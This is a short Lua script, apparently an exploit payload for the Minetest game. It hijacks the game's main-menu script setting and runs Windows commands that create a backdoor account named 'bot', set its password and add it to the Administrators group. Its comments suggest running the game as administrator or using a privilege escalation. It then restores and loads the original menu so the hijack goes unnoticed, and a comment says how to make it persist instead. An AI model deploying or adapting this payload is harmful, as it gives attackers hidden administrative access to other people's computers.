print("[+] Executing Exploit Commands...")

-- Below commands are exclusive to Windows 

-- Print current user that the below commands are being ran as.
os.execute("whoami")

-- Following commands need to be ran at elevated privileges
-- Run game as Admininistrator or leverage an LPE

-- Create backdoor user
os.execute("net user bot /add")
-- Add backdoor user to Administrators group
os.execute("net localgroup administrators bot /add")
-- Set password for backdoor user, modify password value as needed.
os.execute("net user bot password")

-- Add in any other commands here...

-- Original main_menu_script path located at: (C:\Users\[USER_NAME]\[MINETEST_PATH]\builtin\mainmenu\init.lua)
local scriptdir = core.get_builtin_path()
local mm_script = scriptdir .. "mainmenu" .. DIR_DELIM .. "init.lua"

-- Restore main menu script path to original file.
-- Comment below line if we want the script to persist upon game start.
minetest.settings:set("main_menu_script", mm_script)

-- Load the original main menu to make it not obvious it was hijacked.
dofile(mm_script)
